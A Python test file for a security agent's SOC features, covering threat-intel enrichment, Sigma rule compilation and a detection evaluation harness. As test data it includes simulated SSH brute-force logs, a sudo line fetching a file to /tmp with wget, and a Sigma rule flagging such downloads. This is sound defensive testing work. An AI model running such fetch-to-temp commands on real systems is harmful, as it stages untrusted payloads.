"""Threat-intel enrichment, Sigma import, and the detection eval harness."""
import json

from virgent.engine import SecurityAgent
from virgent.models import Actor, Severity
from virgent.policy import PolicyEngine
from virgent.soc.detection import DetectionEngine
from virgent.soc.eval import evaluate
from virgent.soc.events import parse_line
from virgent.soc.models import Alert
from virgent.soc.sigma import compile_sigma, load_sigma_rules
from virgent.soc.threatintel import ThreatIntel

ACTOR = Actor(id="test", type="system")

BRUTE_LINES = [f"Jan 10 10:0{i} h sshd[1]: Failed password for root from 45.9.1.2 port 5{i} ssh2"
               for i in range(6)]


# -- threat intel -------------------------------------------------------------

def test_threat_intel_enriches_and_bumps_severity():
    intel = ThreatIntel(indicators={"45.9.1.2": {"malicious": True, "source": "MISP",
                                                  "tags": ["c2", "botnet"]}})
    alerts = [Alert(id="a1", rule="ssh-brute-force", title="x", severity=Severity.HIGH,
                    entities={"ip": "45.9.1.2"})]
    n = intel.enrich_alerts(alerts)
    assert n == 1
    assert alerts[0].severity == Severity.CRITICAL   # HIGH -> CRITICAL
    assert "threat-intel" in alerts[0].description
    assert "c2" in alerts[0].description


def test_threat_intel_no_match_no_change():
    intel = ThreatIntel(indicators={"1.2.3.4": {"malicious": True}})
    alerts = [Alert(id="a1", rule="r", title="x", severity=Severity.LOW,
                    entities={"ip": "9.9.9.9"})]
    assert intel.enrich_alerts(alerts) == 0
    assert alerts[0].severity == Severity.LOW


def test_threat_intel_from_file(tmp_path):
    p = tmp_path / "feed.json"
    p.write_text(json.dumps({"indicators": {"5.5.5.5": {"malicious": True}}}))
    intel = ThreatIntel.from_file(p)
    assert intel.lookup("5.5.5.5")


# -- sigma --------------------------------------------------------------------

SIGMA_YAML = """
title: Suspicious Wget To Temp
level: high
detection:
  selection:
    event_type: sudo_command
    cmd|contains: /tmp/
  condition: selection
description: wget/curl writing to /tmp via sudo
"""


def test_compile_and_run_sigma_rule():
    rules = load_sigma_rules(SIGMA_YAML)
    assert len(rules) == 1
    ev = parse_line("Jan 10 10:00 h sudo:  bob : COMMAND=/usr/bin/wget -O /tmp/x http://e/x")
    alert = rules[0](ev)
    assert alert is not None
    assert alert.rule == "sigma-suspicious-wget-to-temp"
    assert alert.severity == Severity.HIGH


def test_sigma_condition_and_or():
    rule = compile_sigma({
        "title": "AndOr", "level": "medium",
        "detection": {
            "sel_a": {"event_type": "ssh_login_failed"},
            "sel_b": {"user": "root"},
            "condition": "sel_a and sel_b",
        }})
    hit = parse_line("Jan 10 10:00 h sshd[1]: Failed password for root from 1.2.3.4 port 22 ssh2")
    miss = parse_line("Jan 10 10:00 h sshd[1]: Failed password for alice from 1.2.3.4 port 22 ssh2")
    assert rule(hit) is not None
    assert rule(miss) is None   # user != root


def test_sigma_rules_run_in_detection_engine():
    engine = DetectionEngine(extra_rules=load_sigma_rules(SIGMA_YAML))
    ev = parse_line("Jan 10 10:00 h sudo:  bob : COMMAND=/bin/cp /tmp/evil /usr/bin/")
    alerts = engine.run([ev])
    assert any(a.rule == "sigma-suspicious-wget-to-temp" for a in alerts)


# -- eval harness -------------------------------------------------------------

def test_eval_precision_recall():
    cases = [
        {"events": BRUTE_LINES, "expected": ["ssh-brute-force"]},
        {"events": ["Jan 10 10:00 h sshd[1]: Accepted password for alice from 10.0.0.1 port 22 ssh2"],
         "expected": []},   # benign, should produce nothing
    ]
    m = evaluate(cases)
    assert m.tp >= 1
    assert m.fp == 0
    assert m.recall == 1.0
    assert 0 <= m.f1 <= 1


def test_eval_counts_false_negative():
    # expect a rule that won't fire -> a false negative, recall < 1
    cases = [{"events": ["benign line nothing here"], "expected": ["ssh-brute-force"]}]
    m = evaluate(cases)
    assert m.fn == 1
    assert m.recall == 0.0


# -- engine wiring ------------------------------------------------------------

def test_engine_wires_sigma_and_intel_from_policy(tmp_path):
    feed = tmp_path / "feed.json"
    feed.write_text(json.dumps({"indicators": {"45.9.1.2": {"malicious": True, "source": "OTX"}}}))
    policy = PolicyEngine({
        "actions": {"default": "allow"},
        "detection": {"sigma_inline": SIGMA_YAML, "threat_feed": str(feed)},
    })
    agent = SecurityAgent(workdir=tmp_path / "wd", policy=policy, actor=ACTOR)
    assert agent.soc.detector.extra_rules            # sigma imported
    assert agent.soc.threat_intel is not None        # feed loaded

    log = tmp_path / "auth.log"
    log.write_text("\n".join(BRUTE_LINES) + "\n")
    agent.ingest(str(log))
    alerts, incidents = agent.soc_detect()
    # brute-force alert from the known-bad IP should be enriched to CRITICAL
    bf = [a for a in alerts if a.rule == "ssh-brute-force"]
    assert bf and bf[0].severity == Severity.CRITICAL


def test_engine_soc_eval_audited(tmp_path):
    policy = PolicyEngine({"actions": {"default": "allow"}})
    agent = SecurityAgent(workdir=tmp_path / "wd", policy=policy, actor=ACTOR)
    result = agent.soc_eval([{"events": BRUTE_LINES, "expected": ["ssh-brute-force"]}])
    assert "precision" in result and result["recall"] == 1.0
    actions = [r["action"] for r in agent.audit.iter_records()]
    assert "soc.eval" in actions
